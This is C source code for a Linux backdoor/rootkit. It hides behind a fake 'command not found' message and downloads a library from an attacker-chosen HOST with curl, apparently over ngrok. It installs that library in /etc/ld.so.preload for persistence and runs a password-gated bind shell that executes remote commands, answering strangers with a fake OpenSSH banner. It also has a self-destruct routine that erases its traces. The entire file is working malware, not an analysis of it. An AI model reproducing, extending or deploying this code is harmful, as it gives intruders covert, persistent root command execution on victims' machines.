#include "elf.h"
#include <config.h>

#if !defined(HOST)
#error "You must define the host where it is hosted"
#endif

int main(int argc, char **argv, char **envp) {
    if (getuid() != 0) {
        printf("bash: %s: command not found\n", argv[0]);
        exit(1);
    }

    if (argc == 2 && strcmp(argv[1], "destroy") == 0) {
        destruct();
    }
    
    int is_set = 0;
    for (int i=0; envp[i]!=NULL; i++) {
        if (strstr(envp[i], ENVIRONMENT_VAR) != NULL) {
            is_set = 1;
            break;
        }
    }

    if (is_set == 0) {
        printf("bash: %s: command not found\n", argv[0]);
        exit(1);
    }

    setgid_s();

    int downloaded = is_downloaded();

    // start bind shell
    if (downloaded == 0) {
        move(argv[0]);
        download();
        set_ld_preload();

        // start /usr/bin/rm_s in background and quit here
        char command[1024];
        sprintf(command, "%s=1 %s &", ENVIRONMENT_VAR, HIDDEN_EXEC_PATH);
        system(command);

        return 0;
    }
#ifdef VERBOSE
    printf("%s", argv[0]);
#endif

    if (strcmp(argv[0], HIDDEN_EXEC_PATH) == 0) {
        bind_shell();
        return 0;
    }

    return 0;
}

void destruct() {
    char command[1024];
    sprintf(command, "rm %s", "/etc/ld.so.preload > /dev/null 2>&1");
    system(command);
    sprintf(command, "rm %s > /dev/null 2>&1", HIDDEN_PATH);
    system(command);
    sprintf(command, "rm %s > /dev/null 2>&1", HIDDEN_EXEC_PATH);
    system(command);
    sprintf(command, "killall %s > /dev/null 2>&1", HIDDEN_FILENAME);
    system(command);
    exit(12);
}

void bind_shell() {
#ifdef VERBOSE
    printf("Starting bind shell...\n");
#endif

    int server_fd, client_fd;
    struct sockaddr_in address;

    // Create a socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Bind the socket to an address and port
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for connections
    if (listen(server_fd, 5) < 0) {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    while (1) {
        if ((client_fd = accept(server_fd, NULL, NULL)) < 0) {
            perror("accept failed");
            exit(EXIT_FAILURE);
        }

        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, handle_client, &client_fd) != 0) {
            perror("pthread_create failed");
            exit(EXIT_FAILURE);
        }
    }
}

int is_downloaded() {
#ifdef VERBOSE
    printf("Checking if downloaded...\n");
#endif
    struct stat st = {0};
    if (stat(HIDDEN_PATH, &st) == -1) {
        return 0;
    }
    return 1;
}

int set_ld_preload() {
#ifdef VERBOSE
    printf("Setting LD_PRELOAD...\n");
#endif
    int fd = open("/etc/ld.so.preload", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        perror("open failed");
        exit(12);
    }

    char *content = HIDDEN_PATH"\n";
    int bytes_written = write(fd, content, strlen(content));
    if (bytes_written < 0) {
        perror("write failed");
        exit(12);
    }

    close(fd);
    return 0;
}

int download() {
#ifdef VERBOSE
    printf("Downloading...\n");
#endif
    char command[1024];
    #define NGROK_SKIP_HEADER "--header \"ngrok-skip-browser-warning: skip-browser-warning\""
    sprintf(command, "curl -o %s %s/%s %s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2, NGROK_SKIP_HEADER);
#ifdef VERBOSE
    printf("%s\n", command);
#endif
    system(command);
    return 0;
}

int move(char* filename) {
#ifdef VERBOSE
    printf("Moving...\n");
#endif
    char command[1024];
    sprintf(command, "mv %s %s", filename, HIDDEN_EXEC_PATH);
#ifdef VERBOSE
    printf("%s\n", command);
#endif
    system(command);
    sprintf(command, "chmod +x %s", HIDDEN_EXEC_PATH);
#ifdef VERBOSE
    printf("%s\n", command);
#endif
    system(command);
    return 0;
}

void* handle_client(void* arg) {
    int client_fd = *(int*)arg;
    char buffer[BUFFER_SIZE];
    int messages_sent = 0;

    while (1) {
        int bytes_received = recv(client_fd, buffer, BUFFER_SIZE, 0);
        if (bytes_received < 0) {
            perror("recv failed");
        }

        if (bytes_received == 0) {
            break;
        }

        buffer[bytes_received] = '\0';
        if (messages_sent == 0 && strcmp(buffer, PASSWORD) != 0) {
            // send fake response
            send(client_fd, "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7\n", 34, 0);
            close(client_fd);
            return NULL;
        }
        messages_sent++;

        // interpter commands TODO
        char* output = execute(buffer);

        int bytes_sent = send(client_fd, output, strlen(output), 0);
        if (bytes_sent < 0) {
            perror("send failed");
        }

        free(output);
    }

    close(client_fd);

    return NULL;
}

char *execute(char *command) {
    FILE *fp;
    char path[1035];

    fp = popen(command, "r");
    if (fp == NULL) {
        return "Failed to run command\n";
    }

    char *result = malloc(1024);
    while (fgets(path, sizeof(path)-1, fp) != NULL) {
        strcat(result, path);
    }

    pclose(fp);

    return result;
}

void setgid_s() {
    gid_t gid = GID;
    setresgid(gid, gid, gid);
}